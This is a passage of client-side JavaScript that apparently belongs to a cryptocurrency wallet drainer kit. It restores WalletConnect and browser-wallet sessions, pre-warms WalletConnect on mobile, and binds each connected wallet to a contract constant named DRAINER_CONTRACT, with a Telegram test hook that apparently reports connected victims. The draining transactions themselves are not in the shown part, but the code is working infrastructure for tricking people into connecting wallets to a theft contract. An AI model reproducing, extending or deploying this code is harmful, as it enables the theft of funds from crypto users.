          const a = provider.accounts[0];
          wcProvider = provider;
          activeProvider = provider;
          connectionMode = 'walletconnect';
          currentSession = provider.session;
          web3Instance = new Web3Ctor(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          saveWallet(a, 'walletconnect');
          updateConnectedUI(a, 'evm');
          logDebug(`♻️ WC session restored: ${a}`);
          return;
        }
      } catch (e) {
        logDebug('WC restore: ' + e.message);
      }
    }

    // --- Injected restore (desktop) ---
    if ((savedMode === 'injected' || !savedMode) && isDesktopDevice) {
      const prov = window.ethereum;
      if (prov) {
        try {
          const accounts = await prov.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = prov;
            activeProvider = prov;
            connectionMode = 'injected';
            web3Instance = new Web3Ctor(prov);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            attachInjectedEvents(prov);
            updateConnectedUI(savedWallet, 'evm');
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('Injected restore: ' + e.message);
        }
      }
    }

    logDebug('⚠️ No restorable session — clearing saved wallet');
    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  (async function boot() {
    try {
      const [libs] = await Promise.all([
        loadLibraries(),
        pickRelayUrl().catch(() => null),
      ]);
      EthereumProvider = libs.EthereumProvider;
      Web3Ctor = libs.Web3;
      logDebug('✅ All libraries loaded');

      setupEIP6963();

      // Pre-warm WC on mobile so first tap is instant.
      if (isMobileDevice) {
        logDebug('📱 Pre-warming WalletConnect…');
        initWalletConnect({ useFallbackId: false }).catch(() => {});
      }

      // Let EIP-6963 announce, then restore.
      await new Promise((r) => setTimeout(r, 300));
      await restoreWalletConnection();
    } catch (err) {
      logDebug('Fatal: ' + err.message);
      showStatus('Failed to load wallet libraries', 'error');
      return;
    }

    logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
    console.log('✅ main.js ready — test with testTelegram("hi")');
  })();
})();
